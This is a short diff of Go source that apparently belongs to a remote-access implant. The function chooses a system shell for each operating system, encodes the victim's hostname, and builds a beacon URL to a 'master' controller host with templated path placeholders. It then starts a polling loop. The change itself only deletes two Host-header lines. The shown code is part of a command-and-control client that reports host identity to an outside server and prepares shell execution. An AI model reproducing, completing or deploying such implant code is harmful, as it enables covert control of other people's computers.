@@ -1281,8 +1281,6 @@ func send() { //发送头部信息
             initHttpClient()
             if osname == "win"{version = "cmd"}else if osname == "linux" || osname == "macos"{version = "bash"}else if osname == "android"{version="/system/bin/sh"}
             clientname,_ = os.Hostname()
-            post_headers["Host"] = master
-            get_headers["Host"] = master
             client_b := customBase64Encode([]byte(clientname))
             url := protocol + master + "//*Path*/?/*option*/=/*ConnPath*/&/*uid*/=" + uid + "&/*hostname*/=" + client_b
             for {
